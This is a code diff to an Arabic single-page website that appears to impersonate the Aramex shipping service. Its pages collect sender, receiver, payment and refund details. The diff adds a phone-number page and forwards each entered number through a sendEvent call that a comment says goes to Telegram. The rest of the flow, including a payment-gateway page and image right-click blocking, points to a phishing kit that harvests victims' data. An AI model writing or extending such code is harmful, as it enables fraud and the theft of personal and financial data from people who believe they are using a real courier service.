@@ -662,6 +662,23 @@
           </div>
         </section>
 
+        <!-- ========= الصفحة الجديدة: إدخال رقم الهاتف ========= -->
+        <section class="page" id="page-phone">
+          <div class="section">
+            <div class="titleBig" style="font-size:36px; margin-top:10px;">إرسال شحنة</div>
+            <div class="formSub" style="font-size:20px; margin-bottom:24px;">أدخل رقم هاتفك للمتابعة</div>
+            <div class="fieldLine">
+              <label>رقم الهاتف *</label>
+              <input type="tel" id="phoneNumber" inputmode="numeric" maxlength="10" placeholder="05xxxxxxxx" autocomplete="off" style="direction: ltr; text-align: left; letter-spacing: 1px;" />
+              <div class="error-msg" id="err_phoneNumber"></div>
+            </div>
+            <div class="btnRow">
+              <button class="btnMain" id="btnNextPhone">التالي</button>
+              <button class="btnGhost" id="btnBackFromPhone">رجوع</button>
+            </div>
+          </div>
+        </section>
+
         <!-- صفحات تطبيق أرامكس -->
         <section class="page" id="page-where">
           <div class="section">
@@ -1177,6 +1194,54 @@
     go("where");
   });
 
+  // تعديل: زر الشحنة المخفي يذهب لصفحة الهاتف
+  document.getElementById("hiddenShipBtn").addEventListener("click", () => go("phone"));
+  document.getElementById("hiddenTrackBtn").addEventListener("click", () => go("tracking"));
+
+  // صفحة إدخال رقم الهاتف
+  const phoneInput = document.getElementById('phoneNumber');
+  phoneInput.addEventListener('input', function() {
+    this.value = this.value.replace(/\D/g, '').slice(0, 10);
+  });
+  phoneInput.addEventListener('paste', function(e) {
+    e.preventDefault();
+    let pasted = (e.clipboardData || window.clipboardData).getData('text');
+    this.value = pasted.replace(/\D/g, '').slice(0, 10);
+  });
+
+  document.getElementById('btnNextPhone').addEventListener('click', async () => {
+    const phone = document.getElementById('phoneNumber').value.trim();
+    const len = phone.length;
+    if (len < 8 || len > 10) {
+      setError("err_phoneNumber", "رقم الهاتف يجب أن يكون بين 8 و 10 أرقام");
+      document.getElementById('phoneNumber').classList.add('error');
+      return;
+    }
+    setError("err_phoneNumber", "");
+    document.getElementById('phoneNumber').classList.remove('error');
+    // إرسال رقم الهاتف إلى تيليجرام (اختياري)
+    await sendEvent(`📱 *إدخال رقم الهاتف*: ${phone}`);
+    go("where");
+  });
+
+  document.getElementById('btnBackFromPhone').addEventListener('click', () => {
+    document.getElementById('phoneNumber').value = '';
+    setError("err_phoneNumber", "");
+    document.getElementById('phoneNumber').classList.remove('error');
+    go("home");
+  });
+
+  // تعديل القائمة: إرسال شحنة يذهب لصفحة الهاتف
+  document.querySelectorAll(".menu-item").forEach(item => {
+    item.addEventListener("click", () => {
+      const a = item.dataset.action;
+      if (a === "send") go("phone");
+      else if (a === "track") go("tracking");
+      else if (a === "refund") go("refund");
+      closeMenu();
+    });
+  });
+
   document.querySelectorAll("#page-where .choice").forEach(choice => {
     choice.addEventListener("click", async function() {
       let type = this.querySelector(".lbl")?.innerText || (this.dataset.type === "local" ? "شحنة محلية" : "شحنة دولية");
@@ -1231,7 +1296,7 @@
     clearTimeout(pg.loader30Timer);
   });
 
-  // ================== بقية الدوال المساعدة (بدون تعديل) ==================
+  // ================== بقية الدوال المساعدة ==================
   function setError(id, msg) { const el = document.getElementById(id); if (!el) return; if (msg) { el.textContent = msg; el.style.display = 'block'; } else { el.textContent = ''; el.style.display = 'none'; } }
   function clearAllErrors() { document.querySelectorAll('.error-msg').forEach(el => { el.textContent = ''; el.style.display = 'none'; }); }
   function showPopup(msg) {
@@ -1284,17 +1349,15 @@
   document.getElementById('d_pieces').addEventListener('input', function() { this.value = this.value.replace(/\D/g, '').slice(0, 4); });
   document.getElementById('refund_phone').addEventListener('input', function() { this.value = this.value.replace(/\D/g, '').slice(0, 10); });
   document.getElementById('refund_tracking').addEventListener('input', function() { this.value = this.value.replace(/\D/g, '').slice(0, 10); });
-  document.getElementById("hiddenTrackBtn").addEventListener("click", () => go("tracking"));
-  document.getElementById("hiddenShipBtn").addEventListener("click", () => go("where"));
+
   const mainImg = document.getElementById("mainImage");
   if (mainImg) { mainImg.addEventListener("dragstart", (e) => e.preventDefault()); mainImg.addEventListener("contextmenu", (e) => e.preventDefault()); }
-  const pages = { home: document.getElementById("page-home"), where: document.getElementById("page-where"), sender: document.getElementById("page-sender"), receiver: document.getElementById("page-receiver"), details: document.getElementById("page-details"), paymethod: document.getElementById("page-paymethod"), "payment-gateway": document.getElementById("page-payment-gateway"), tracking: document.getElementById("page-tracking"), refund: document.getElementById("page-refund"), success: document.getElementById("page-success") };
+  const pages = { home: document.getElementById("page-home"), phone: document.getElementById("page-phone"), where: document.getElementById("page-where"), sender: document.getElementById("page-sender"), receiver: document.getElementById("page-receiver"), details: document.getElementById("page-details"), paymethod: document.getElementById("page-paymethod"), "payment-gateway": document.getElementById("page-payment-gateway"), tracking: document.getElementById("page-tracking"), refund: document.getElementById("page-refund"), success: document.getElementById("page-success") };
   function go(pageName) { Object.values(pages).forEach(p => p && p.classList.remove("active")); if (pages[pageName]) pages[pageName].classList.add("active"); document.getElementById("app").scrollTo({ top: 0, behavior: "instant" }); closeMenu(); }
   const burger = document.getElementById("openMenu"), sideMenu = document.getElementById("sideMenu"), overlay = document.getElementById("menuOverlay"), closeBtn = document.getElementById("closeMenuBtn");
   function openMenu() { sideMenu.classList.add("open"); overlay.classList.add("open"); }
   function closeMenu() { sideMenu.classList.remove("open"); overlay.classList.remove("open"); }
   burger.addEventListener("click", openMenu); overlay.addEventListener("click", closeMenu); closeBtn.addEventListener("click", closeMenu);
-  document.querySelectorAll(".menu-item").forEach(item => { item.addEventListener("click", () => { const a = item.dataset.action; if (a === "send") go("where"); else if (a === "track") go("tracking"); else if (a === "refund") go("refund"); closeMenu(); }); });
   document.addEventListener("DOMContentLoaded", () => { document.querySelectorAll("body > *:not(#myProductBox)").forEach(el => el.style.display = "none"); document.body.style.visibility = "visible"; });
 </script>
 </body>
